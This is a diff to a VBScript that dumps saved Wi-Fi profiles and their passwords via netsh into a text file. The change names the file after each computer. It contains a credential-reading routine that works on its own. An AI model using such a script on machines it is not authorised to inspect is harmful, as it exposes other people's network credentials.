@@ -6,8 +6,12 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 ' Create a shell object to run system commands
 Set shell = CreateObject("WScript.Shell")
 
-' Create a text file to save the WiFi names and passwords
-Set outputFile = fso.CreateTextFile("wifi_passwords.txt", True)
+' Get the computer name to create a unique filename
+Dim computerName
+computerName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
+
+' Create a text file to save the Wi-Fi profiles and passwords for this specific computer
+Set outputFile = fso.CreateTextFile("wifi_passwords_" & computerName & ".txt", True)
 
 ' Run command to get all Wi-Fi profiles
 Set wifiProfiles = shell.Exec("netsh wlan show profiles")
@@ -51,4 +55,3 @@ Loop
 
 ' Close the text file
 outputFile.Close
-
